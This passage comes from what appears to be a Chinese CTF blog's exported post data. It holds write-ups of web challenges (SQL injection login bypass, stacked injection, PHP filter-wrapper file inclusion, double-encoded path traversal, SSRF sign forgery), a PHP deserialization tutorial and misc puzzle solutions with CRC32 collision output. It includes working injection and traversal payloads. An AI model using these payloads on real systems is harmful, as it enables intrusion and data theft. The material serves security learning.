2019]EasySQL这题经过测试可以知道会有三种情况，一种是回nonono，一种是回复数组，一种是没有回复。\n\n通过nonono可以知道哪些被过滤了。例如from、flag、之类的都被过滤了，所以尝试使用堆叠注入。\n\n可以看到有一个CTF数据库，里面有一个Flag表。不过卡在这里了，from我绕不过去，而且Flag也被ban了。想了好久都不知道如何去过，只好看一下WP了。\n看到有一种非预期解，好像当时泄露了，\n\"select $_POST['query'] || flag from Flag\";\n\n这下终于知道是什么个情况了，非预期解法是传入*,1，这样最后sql语句就是：\n\"select *,1 || flag from Flag\";\n\n就可以直接查出flag来：\n\n当然也有预期解法：\n\"select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag\"\n\n预期解用到了一个操作,之前没有关注过，set sql_mode=pipes_as_concat\n\n\n\n\n\n\n\n\n\nsql_mode：是一组mysql支持的基本语法及校验规则PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似\n因为||成为了一个连接符，所以就可以顺利读出flag了。\n\n我们可以通过@@sql_mode;select 1来查看一下都有哪些sql_mode支持\n\n这一题真的要求很博学了，要懂这个点才能去做，还要好好学啊。\n0x02 [极客大挑战 2019]EasySQL在username处输入一个’号，报错了\n\n所以是有注入的可能的，不过这里注意到一点多出来的’居然跑到password上去了，这就很奇怪了。\n接着直接在username处试一试能不能绕过,结果并没有什么用。结果发现#、%23、–+都不太好使\n\n所以改了一下username=admin&#39; or &#39;1&#39;=&#39;1&#39;&amp;password=123,看到了如下的报错信息。\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;1&#39;&#x3D;&#39;1&#39;&#39; and password&#x3D;&#39;123&#39;&#39; at line 1\n\n所以可以推测sql语句应该是这样的：\nselect * from xxx where username=\"xxx\" and password=\"xxx\"\n\n然后现在我们用不了注释符，所以必须在password的结尾来绕过\npayload:\nusername=admin&amp;password=123' or '1'='1\n\n这样传入进去构造出\nselect * from xxx where username=\"admin\" and password=\"123\" or \"1\"=\"1\"\n\n成功绕过了登陆限制。\n\n0x03 [极客大挑战 2019]Havefun撸猫还行，在源码里看到了一段php代码。\n$cat=$_GET['cat'];\n        echo $cat;\n        if($cat=='dog')&#123;\n            echo 'Syc&#123;cat_cat_cat_cat&#125;';\n        &#125;\n\n来试一试吧，传入一个cat，没有看到回显，现在传入一个cat=dog，竟然就直接出flag了，看来是签到题。\n\n0x04 [极客大挑战 2019]Secret File提示把一切都放在这了，看一前端代码，看到了一个php页面Archive_room.php\\\n\n点击了secret，直接跳转到了访问action.php\n\n但是访问过后跳转到了end.php而不是action.php\n所以bp抓包看看,果然如此，发现了真正的secr3c.php\n\n访问一下secr3c.php，得到了一个php\n&lt;html&gt;\n    &lt;title&gt;secret&lt;&#x2F;title&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n&lt;?php\n    highlight_file(__FILE__);\n    error_reporting(0);\n    $file&#x3D;$_GET[&#39;file&#39;];\n    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;\n        echo &quot;Oh no!&quot;;\n        exit();\n    &#125;\n    include($file); \n&#x2F;&#x2F;flag放在了flag.php里\n?&gt;\n&lt;&#x2F;html&gt;\n\nfile=file:///var/www/html/flag.php，不能直接读，看来要用PHP伪协议。\n\npayload:\nfile&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php\n\n解码得到的base64,就可以得到源码了，flag就在里面：\n&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;\n        &lt;title&gt;FLAG&lt;&#x2F;title&gt;\n    &lt;&#x2F;head&gt;\n\n    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n        \n        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n        \n        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;\n            &lt;?php\n                echo &quot;我就在这里&quot;;\n                $flag &#x3D; &#39;flag&#123;1c8bc36a-9339-4e83-9525-491309a016f9&#125;&#39;;\n                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;\n            ?&gt;\n        &lt;&#x2F;p&gt;\n    &lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;","slug":"BUUOJ刷题-2020-20-04","date":"2020-10-04T06:27:46.000Z","categories_index":"CTF","tags_index":"WEB,SUCTF,BUUOJ","author_index":"A1andNS"},{"id":"fbef6aca98c892cb1e786b7509bd311a","title":"BUUOJ刷题小记","content":"0x01 De1CTF SSRF Me考察代码审计\n看名字感觉是SSRF的题目，但是打开发现更像是一题代码审计，给了一个flask框架的代码，有点长先做一下美化，在开始看。\n#! /usr/bin/env python #encoding=utf-8\n\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nurllib.reload(sys)\nsys.setdefaultencoding('latin1')\napp = Flask(__name__)\nsecert_key = os.urandom(16)\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n    self.action = action\n    self.param = param\n    self.sign = sign\n    self.sandbox = md5(ip)\n    if(not os.path.exists(self.sandbox)):\n        # SandBox For Remote_Addr\n        os.mkdir(self.sandbox)\n    def Exec(self):\n        result = &#123;&#125;\n        result['code'] = 500\n        if(self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if(resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else :\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else :\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\ndef checkSign(self):\n    if(getSign(self.action, self.param) == self.sign):\n        return True\n    else :\n        return False\n#generate Sign For Action Scan\n@app.route(\"/geneSign\", methods = ['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n@app.route('/De1ta', methods = ['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n\n@app.route('/')\n\ndef index():\n    return open(\"code.txt\", \"r\").read()\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[: 50]\n    except:\n        return \"Connection Timeout\"\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\ndef waf(param):\n    check = param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else :\n        return False\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host = '0.0.0.0', port = 80)\n\n所以我们现在看到的就是code.txt文件,然后看到一个和我们的目标有关的代码段：\ndef Exec(self):\n    result = &#123;&#125;\n    result['code'] = 500\n    if(self.checkSign()):\n        if \"scan\" in self.action:\n            tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n            resp = scan(self.param)\n            if(resp == \"Connection Timeout\"):\n                result['data'] = resp\n            else :\n                print resp\n                tmpfile.write(resp)\n                tmpfile.close()\n            result['code'] = 200\n        if \"read\" in self.action:\n            f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n            result['code'] = 200\n            result['data'] = f.read()\n        if result['code'] == 500:\n            result['data'] = \"Action Error\"\n    else :\n        result['code'] = 500\n        result['msg'] = \"Sign Error\"\n    return result\n\n上面的代码中有两个大块，一个是scan，一个是read，但是要能够进到这两个判断条件就必须先满足checkSign(),如果满足了checkSign就会判断action里面有没有scan或read，来决定是否做读和写。这里有一个细节，两个判断语句都是用的if，而不是if-else结构，也就是说如果，上面一个没有被return，只要满足下面一个条件就也可以执行，那么如果action是’readscanf’或’scanfread’，可能就可以即进行写也读，所以就可以把我们需要访问的文件内容写入result.txt同时读出来。那下面就先看一下checkSign()函数是怎么写的：\ndef checkSign(self):\n    if(getSign(self.action, self.param) == self.sign):\n        return True\n    else :\n        return False\n\ncheckSign()函数调用了getSign()函数，而getSign()函数则是使用传入进去的action和param与一个secert_key直接拼接，然后做md5加密，再转化为16进制。\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n接下来我们看一下如何来验证身份，/geneSign路由有个认证函数，会返回一个认证信息，不过这里的action被预设了scan，但是getSign函数里的返回值，三个变量是直接进行的拼接，没有什么分隔。那么就可以在param变量里做文章了，加入一个read到param里面。\n@app.route(\"/geneSign\", methods = ['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n先去访问一下路由/geneSign?param=flag.txtread，然后获得一个2641cc09285ada3ac12db2293c6eb1bb认证信息\n@app.route('/De1ta', methods = ['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n\n这里可以看出，sign和action是通过cookie来传递的，所以就可以按照上面的格式去访问/De1ta路由了。\n\n0x02 HCTF2018 WarmUp考察代码审计\n提示source.php直接看源码，做代码审计。\nif (! empty($_REQUEST['file'])\n    &amp;&amp; is_string($_REQUEST['file'])\n    &amp;&amp; emmm::checkFile($_REQUEST['file'])\n) &#123;\n    include $_REQUEST['file'];\n    exit;\n&#125; else &#123;\n    echo \"&lt;br>&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n&#125;\n\n这里可以看到我们需要传入一个file参。并且满足三个条件，第一个是file变量不空，第二个是file变量是字符串，第三个是通过check函数的检验，否则返回滑稽。那么就看一下checkFile函数的情况：\n    public static function checkFile(&amp;$page)\n    &#123;\n        $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n        if (! isset($page) || !is_string($page)) &#123;\n            echo \"you can't see it\";\n            return false;\n        &#125;\n\n        if (in_array($page, $whitelist)) &#123;\n            return true;\n        &#125;\n        //?file=source.php?file=fff\n        $_page = mb_substr(\n            $page,\n            0,\n            mb_strpos($page . '?', '?')\n        );\n        if (in_array($_page, $whitelist)) &#123;\n            return true;\n        &#125;\n\n        $_page = urldecode($page);\n        $_page = mb_substr(\n            $_page,\n            0,\n            mb_strpos($_page . '?', '?')\n        );\n        if (in_array($_page, $whitelist)) &#123;\n            return true;\n        &#125;\n        echo \"you can't see it\";\n        return false;\n    &#125;\n&#125;\n\nhint.php提示flag在ffffllllaaaagggg\n这里有4个判断语句，第一个是如果page不存在或page不是字符串，都会直接返回flase，第二个是，如果page在白名单里就会返回true，第三个是被截取的page需要在白名单里，才会返回true，第四个是如果page在解url编码后再被截取，也要在白名单里，才返回true，否则就false。这里第二个if不能让他满足，因为我们要包含的文件是ffffllllaaaagggg。\n所以我们要利用最后一个if，所以对？做url编码，编码两次%253F，这样在一开始传入的时候会解码一起，在到最后一个if之前会再次解码回?这样在最后一次判断的时候就可以通过。\npayload:\n?file&#x3D;source.php%253F.&#x2F;ffffllllaaaagggg\n\n?file&#x3D;source.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg\n\n最后一个一个试出来：\n\n","slug":"BUUOJ刷题小记","date":"2020-10-03T06:03:06.000Z","categories_index":"CTF","tags_index":"WEB,BUUOJ,De1CTF 2019","author_index":"A1andNS"},{"id":"5bbc7d316ccd2a535cfb30c74b9fa118","title":"PHP反序列化","content":"序列化与反序列化序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。这个过程就像把数据封装成某种可逆的特殊结构，然后在另一台计算机或相同环境下恢复回数据，所谓的反序列化就是恢复的这个逆向过程。\n序列化的目的就是方便在计算机中或计算机间传输数据和存储。serialize()将一个对象转换为一个字符串，unserialize()则是将一个字符串还原回一个对象，在PHP应用中，序列化和反序列化一般用做缓存，常见于session缓存，cookie之类。\nPHP反序列化中常见的PHP魔术方法void __wakeup(void)这个魔术方法在反序列化恢复对象之前会被调用，这是因为unserialize()函数会检查是否存在一个__wakeup()方法，如果存在就调用这个方法，预先准备对象需要的资源。\nvoid __construct([ mixed $args [,$…]])这个魔术方法是构造函数，具有构造函数的类会在每次创建新对象时调用此方法，一般用于对变量赋初值。\nvoid __destruct(void)这个魔术方法是析构函数，他会在某个对象的所有引用被删除或者对象被显式销毁时执行。\npublic string __toString(void)这个魔术方法用于把一个类当成字符串时应该怎么回应。例如使用echo $obj;应该显示写什么东西。这个方法就是在这个时候起作用的，会返回一下字符串，否则将会出现致命错误。\n__sleep()这个魔术方法是在序列化一个对象之前就调用此方法，如果这个方法存在，在序列化对象之前会调用这个方法，目的是清理对象，并且返回一个包含对象中所有变量名称的数组。如果改方法不返回任何内容，则NULL被序列化。\n__call()这个魔术方法在调用对象中不存在的方法时会自动调用。例如一个类A中不存在一个方法run()或run()的访问权限不授权。那么在$obj=new A()后去执行obj-&gt;run()就会自动调用__call()方法出来救场了。\n__get()在调用私有属性的时候会自动执行该魔术方法\n__isset()在不可访问的属性上调用isset()或者empty()就会触发该魔术方法\n__unset()在不可访问的属性上使用unset()时就会触发该魔术方法。\n__invoke()但尝试以调用函数的方式调用一个对象时，就会调用invoke方法。\nPHP反序列化漏洞成因PHP反序裂化漏洞也被称为PHP对象注入，是因为程序对输入数据的处理不当导致的，很多时候漏洞都和对用户输入的过度信任导致。\n一个简单例子\n&lt;?php\nclass A&#123;\n    public $target = \"demo\";\n    function __destruct()\n    &#123;\n        // TODO: Implement __destruct() method.\n        echo \"this is the destructing&lt;br/>\";\n        echo $this->target.\"&lt;br/>\";\n        echo \"destructed&lt;br/>\";\n    &#125;\n&#125;\n\n$a = $_GET['target'];\n$a_unser = unserialize($a);\n?>\n\n析构函数在对象被销毁时会输出target的值，所以我们可以通过构造一个对象来，控制$target的数值，从而控制数据流。\n构造这个反序列化利用脚本：\n&lt;?php\nclass A\n&#123;\n    public $target = \"I am A1andNS!\";\n&#125;\n\n$a = serialize(new A());\necho $a;\n\n?>\n\n生成这个序列化的结果：\nO:1:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;s:13:&quot;I am A1andNS!&quot;;&#125;\n\n这样就控制了target的输出内容了。\n\n同理如果target设置为了&lt;script&gt;alert(1)&lt;/script&gt;，就可以实现XSS了。\n\nPHP反序列化和POP链Autoloading传统的PHP要求应用导入每一个类中的所有类文件，这就意味着需要include大量的文件，这显然不是什么聪明的方法。所以当前的PHP主流框架都使用Autoloading自动加载类来完成这样的工作，提高了效率，简化了类之间调用的功能，但是也为序列化造成了便利。\n\n\n\n\n\n\n\n\n\nautoloading的实现主要是依靠__autoload()魔术方法来实现，不过__autoload()魔术方法在PHP7.2之后被弃用，取而代之的是spl_autoload_register()函数，他的好处是可以自定义多个autolaoder\nComposer与AutoloadingComposer 是 PHP 的一个依赖管理工具。我们可以在项目中声明所依赖的外部工具库，Composer 会帮你安装这些依赖的库文件，有了它，我们就可以很轻松的使用一个命令将其他人的优秀代码引用到我们的项目中来。\n\n\n\n\n\n\n\n\n\ncomposer默认是从Packagist来下载依赖库的。所以可以从几个方向入手\n1、从可能存在漏洞的依赖库文件入手\n2、从应用的代码框架的逻辑上入手\n3、从PHP语言本身的漏洞入手\n寻找依赖库漏洞寻找依赖库漏洞的粗暴方法：在依赖库中使用RIPS或grep全局搜索__wakeup()和__destruct()，存在POP组件的最好方式，就是直接查看composer.json文件，其中会写应用需要使用哪些库。\n一些可以利用的组件的依赖库：\n任意写\nmonolog&#x2F;monolog(&lt;1.11.0)\nguzzlehttp&#x2F;guzzle\nguzzle&#x2F;guzzle\n任意删除\nswifmailer&#x2F;swiftmailer\n\n除了从依赖库入手，还有就是PHP语言本身的漏洞，比如但序列化字符串中表示对象个数的值大于实际属性个数的时候就会跳过__wakeup()函数的执行。\n下面就以__wakeup()绕过来上个实例class.php文件如下：\n&lt;?php\nclass A&#123;\n    var $target = \"demo\";\n\n    function __wake()&#123;\n        $this->target = \"wakeup!\";\n    &#125;\n\n    function __destruct()\n    &#123;\n        // TODO: Implement __destruct() method.\n        echo \"this is the destructing&lt;br/>\";\n        echo $this->target.\"&lt;br/>\";\n        echo \"destructed&lt;br/>\";\n    &#125;\n&#125;\n\n$a = $_GET['target'];\n$a_unser = unserialize($a);\n?>\n\nexp：\n&lt;?php\nclass A\n&#123;\n    public $target = \"A1andNS!\";\n&#125;\n\n$a = serialize(new A());\necho $a;\n\n?>\n\n如果使用\nO:1:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;s:8:&quot;A1andNS!&quot;;&#125;\n\n\n反序列的时候由于调用了__wakeup()魔术方法，而让target被重置。\npayload:\nO:1:&quot;A&quot;:2:&#123;s:6:&quot;target&quot;;s:8:&quot;A1andNS!&quot;;&#125;\n\n\n这个就通过使用那个改大属性个数来绕过__wakeup()方法，但是需要注意的是这个漏洞在最新版的PHP中已经不存在了\n漏洞CVE: CVE-2016-7124\n受影响版本：\n\n\n\n\n\n\n\n\n\n\nPHP before 5.6.25\nPHP 7.x before 7.0.10\n\n__toString()方法利用但反序列化后对象被输出在模板中的时候会被转换为字符串，这样就会触发相关漏洞，找漏洞的处理流程：\n\n\n\n\n\n\n\n\n\n__toString触发条件：\necho ($obj) / print ($obj) 打印会触发\n字符串拼接时会触发\n格式化字符串时会触发\n与字符串进行==比较的时候触发（PHP在进行==比较的时候会转换参数类型）\n格式化SQL语句，绑定参数时\n数组中有字符串时\n&lt;?php\nclass toString_demo\n&#123;\n    private $test1 = 'test1';\n    public function __construct($test)\n    &#123;\n        $this->test1 = $test;\n    &#125;\n    public function __destruct()\n    &#123;\n        // TODO: Implement __destruct() method.\n        print \"__destruct:\";\n        print $this->test1;\n        print \"&lt;br/>\";\n    &#125;\n    public function __wakeup()\n    &#123;\n        // TODO: Implement __wakeup() method.\n        print \"__wakeup:\";\n        $this->test1 = \"wakeup\";\n        print $this->test1.\"&lt;br/>\";\n    &#125;\n    public function __toString()\n    &#123;\n        // TODO: Implement __toString() method.\n        print \"__toString:\";\n        $this->test1 = \"tosTRING\";\n        return $this->test1.\"&lt;br/>\";\n    &#125;\n&#125;\n$a = new toString_demo(\"demo\");\t//这里会调用__construct()方法\n$b = serialize($a);\n$c = unserialize($b);\t//这里会调用__wakeup()方法\nprint $c;\t//这里会调用__toString()方法\n//结束时调用__destruct()方法\n\n运行结果如下：\n__wakeup:wakeup\n__toString:tosTRING\n__destruct:tosTRING\n__destruct:demo\n\n这里首先在反序列化是调用__wakeup()，然后在输出时调用了__toString()方法，最后在结束时调用了两次__destruct()方法，这是因为有两个对象被销毁了，分别是$a和%c\n反序列化后的对象在经过PHP的字符串函数时，都会触发__toString()方法，例如遇到strlen(), addslashes(), class_exists()等函数时\nPHP_Session序列化和反序列化\n\n\n\n\n\n\n\n\nsession_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器来访问用户session，并且把session序列化存储到指定目录下，一般为/tmp\n常见的PHP_Session的存储位置：\n&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID\n&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID\n\n&#x2F;var&#x2F;lib&#x2F;php5&#x2F;sess_PHPSESSID\n&#x2F;var&#x2F;lib&#x2F;php5&#x2F;sessions&#x2F;sess_PHPSESSID\n\n&#x2F;tmp&#x2F;sess_PHPSESSID\n&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID\n\n这里借用一张图片来说明。\n\nsession相关配置项（这里实在php.ini文件中）\nsession.save_path&#x3D;&quot;&quot;   --设置session的存储路径,默认在&#x2F;tmp\nsession.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动\nsession.serialize_handler   --定义用来序列化&#x2F;反序列化的处理器名字。默认使用php\nsession.save_handler&#x3D;&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)，比如files就是session默认以文件的方式进行存储\n\n在PHP中默认使用的是PHP引擎，如果要还用其他引擎，就需要添加代码一行代码来实现\n&lt;?php\nini_set('session.serialize_handler', 'php_serialize');\nsession_start();\n//what you want to do \n?>\n\nsession存储文件是以sess_sessionid来统一命名的，文件的内容就是session的序列化后内容，例如sess_1ja9n90ssk985tff4r0b2sojd6\nPHPsession出现危害主要是程序员的处理不当，例如前面说了默认使用PHP引擎来进行序列化，但是可以使用ini_set()函数来指定自己要使用的引擎，这里就会出现一个问题了，如果反序列化$_SESSION数据时使用的处理器引擎和序列化时使用的不同，就会出现无法正常反序列化的问题。从而可以利用特殊构造来伪造任意数据。常见的比如存入session时使用的处理器为php_serialize,而反序列化使用的是php处理器。\n$_SESSION['alan'] = '|O:8:\"stdClass\":0:&#123;&#125;';\n//这里的session数据，在存储时使用的序列化处理器是php_serialize\nini_set('session.serialize_handler', 'php_serialize');\nsession_start();\n\na:1:&#123;s:4:&quot;alan&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;\n现在用php处理器去反序列化看看会如何？\n如果反序列化处理器不是php_serialize，而是php的话，那么反序列化后的数据就会变成一个数组，得到一个新的对象。\n\n\n\n\n\n\n\n\n\n当配置选项session.auto_start=On，会自动注册Session会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题,因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类。\n当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题\n参考材料[1]. https://www.cnblogs.com/tr1ple/p/11156279.html\n[2].https://www.cnblogs.com/ichunqiu/p/10484832.html\n","slug":"PHP反序列化","date":"2020-10-02T03:25:15.000Z","categories_index":"学习笔记","tags_index":"反序列化","author_index":"A1andNS"},{"id":"fac16ea8923bbbe8935929d55bdc28af","title":"2020黑盾杯题目记录","content":"记录一下黑盾杯2020，和某比赛题目撞了．\nMisc-Blue\n利用查找功能找到每一轮的开头33，查看上一条查询语句就知道上一个字母是什么，然后手动拼凑成flag\n\nflag&#123;Gre4t_j0B_ON_This_Blue_sh4rk&#125;\n\nMisc-Encrypto伪加密压缩包：\n\n使用7z解压文件，得到一个flag.txt文件，里面是一串base64:UTAxSlUwTkRWRVo3Um1GclpWOWxibU55ZVhCMGFXOXVmUT09，进行解码2次\n\nCMISCCTF&#123;Fake_encryption&#125;\n\nMisc-Tree起初得到一张图片\n\n按照题目的hint，一开始用stegsolve进行通道分离，但是效果不好，分离后没办法直接看清结果，但是可以明显感觉到是存在flag在图片中。所以必须用其他方法了。\n对图片进行处理：\nfrom PIL import Image\n\nimg = Image.open('enc.png')\nw = img.width\nh = img.height\nimg_ob = Image.new(\"RGB\",(w//16,h//16))\n\nfor x in range(w//16):\n    for y in range(h//16):\n        (r,g,b)=img.getpixel((x*16,y*16))\n        img_ob.putpixel((x,y),(r,g,b))\n\nimg_ob.save('1.png')\n\n\n从而得到flag：\nCMISCCTF&#123;coconut_tree&#125;\n\nMisc-Burp一开始采取压缩包密码暴力破解，但是效果不好，小写字母+下划线的1-6位没有成功，感觉方向不对，仔细看看压缩包。\n\n发现原始文件很小，基本都小于5Byte，所以有可能是要考CRC32碰撞。\n用github上的一个开源项目https://github.com/theonlypwner/crc32来做CRC32碰撞。\n先把前面几个文件小1.txt-6.txt的CRC提取出来。\n1.txt 0x6083a1c8 \n2.txt 0xce70d424\n3.txt 0xc3f17511\n4.txt 0x526fd582\n5.txt 0x30e25038\n6.txt 0xaa3e6aea\n\n然后使用脚本碰撞，观察结果\n\n每次都得到4 bytes，而且每次得到4块十六进制数，将十六进制转换为字符看看。\n\n那么就按这个来搞一遍：\na1andns@a1andns-PC:~/Downloads/crc32-master$ python crc32.py reverse 0x6083a1c8\n4 bytes: &#123;0x74, 0x68, 0x65, 0x5f&#125;\nverification checksum: 0x6083a1c8 (OK)\nalternative: Cb9fTf (OK)\nalternative: Jhn4CW (OK)\nalternative: K9Md4R (OK)\nalternative: Lmggsq (OK)\nalternative: Nls5B4 (OK)\nalternative: PNHKc5 (OK)\nalternative: TJUJbV (OK)\nalternative: X4bYjM (OK)\nalternative: apQQ_2 (OK)\nalternative: bmKntz (OK)\nalternative: e9am3Y (OK)\nalternative: tEfsYS (OK)\nalternative: v4NPmF (OK)\na1andns@a1andns-PC:~/Downloads/crc32-master$ php -r \"var_dump(hex2bin('7468655f'));\"\nstring(4) \"the_\"\na1andns@a1andns-PC:~/Downloads/crc32-master$ python3 crc32.py reverse 0xce70d424\n4 bytes: &#123;0x70, 0x61, 0x73, 0x73&#125;\nverification checksum: 0xce70d424 (OK)\nalternative: 1bItKW (OK)\nalternative: 4GKT8a (OK)\nalternative: 5fTuJ4 (OK)\nalternative: Ffa_X0 (OK)\nalternative: KtdPOv (OK)\nalternative: TJQCtz (OK)\nalternative: WjZ07j (OK)\nalternative: ZENsHt (OK)\nalternative: bmOgbV (OK)\nalternative: dhF4Rp (OK)\nalternative: fiRfc5 (OK)\nalternative: l3262D (OK)\nalternative: wXxEd7 (OK)\nalternative: yWguX9 (OK)\nalternative: yjv90a (OK)\nalternative: yv9e1u (OK)\na1andns@a1andns-PC:~/Downloads/crc32-master$ php -r \"var_dump(hex2bin('70617373'));\"\nstring(4) \"pass\"\na1andns@a1andns-PC:~/Downloads/crc32-master$ python3 crc32.py reverse 0xc3f17511\n4 bytes: &#123;0x77, 0x6f, 0x72, 0x64&#125;\nverification checksum: 0xc3f17511 (OK)\nalternative: 4GLZ9v (OK)\nalternative: FG8A0k (OK)\nalternative: Jhm3Tl (OK)\nalternative: SSQs_F (OK)\nalternative: TJVMum (OK)\nalternative: bmHicA (OK)\nalternative: etOWIj (OK)\nalternative: l3583S (OK)\nalternative: lbWY_O (OK)\nalternative: tEetNh (OK)\nalternative: yjq71v (OK)\nalternative: zJzDrf (OK)\na1andns@a1andns-PC:~/Downloads/crc32-master$ php -r \"var_dump(hex2bin('776f7264'));\"\nstring(4) \"word\"\na1andns@a1andns-PC:~/Downloads/crc32-master$ python3 crc32.py reverse 0x526fd582\n4 bytes: &#123;0x5f, 0x68, 0x65, 0x72&#125;\nverification checksum: 0x526fd582 (OK)\nalternative: BbSWOR (OK)\nalternative: FfNVN1 (OK)\nalternative: JhE4Cz (OK)\nalternative: KtKYYw (OK)\nalternative: RS8ESI (OK)\nalternative: SSytHP (OK)\nalternative: WWduI3 (OK)\nalternative: e9Jm3t (OK)\nalternative: izl2S7 (OK)\nalternative: u503G7 (OK)\nalternative: v4ePmk (OK)\nalternative: wXWLr6 (OK)\nalternative: zJRCep (OK)\na1andns@a1andns-PC:~/Downloads/crc32-master$ php -r \"var_dump(hex2bin('5f686572'));\"\nstring(4) \"_her\"\na1andns@a1andns-PC:~/Downloads/crc32-master$ python3 crc32.py reverse 0x30e25038\n4 bytes: &#123;0x65, 0x5f, 0x63, 0x69&#125;                                                  \nverification checksum: 0x30e25038 (OK)                                             \nalternative: 8tDDMh (OK)                                                           \nalternative: Gf5PS3 (OK)                                                           \nalternative: Jt0_Du (OK)                                                           \nalternative: Ktqn_l (OK)                                                           \nalternative: LmvPuG (OK)                                                           \nalternative: SSCCNK (OK)                                                           \nalternative: Y42_wb (OK)                                                           \nalternative: bmZYrL (OK)                                                           \nalternative: cqT4hA (OK)\nalternative: e9pZ5o (OK)\nalternative: lbEiNB (OK)\nalternative: m3f99G (OK)\nalternative: t5K5Z5 (OK)\nalternative: tEwD_e (OK)\nalternative: v4_gkp (OK)\nalternative: zJhtck (OK)\na1andns@a1andns-PC:~/Downloads/crc32-master$ php -r \"var_dump(hex2bin('655f6369'));\"\nstring(4) \"e_ci\"\na1andns@a1andns-PC:~/Downloads/crc32-master$ python3 crc32.py reverse 0xaa3e6aea\n4 bytes: &#123;0x70, 0x68, 0x65, 0x72&#125;\nverification checksum: 0xaa3e6aea (OK)\nalternative: 8tQsKs (OK)\nalternative: Eg45dm (OK)\nalternative: FfaVN1 (OK)\nalternative: Jhj4Cz (OK)\nalternative: KtdYYw (OK)\nalternative: SSVtHP (OK)\nalternative: WWKuI3 (OK)\nalternative: bmOntW (OK)\nalternative: e9em3t (OK)\nalternative: fiRou4 (OK)\nalternative: izC2S7 (OK)\nalternative: v4JPmk 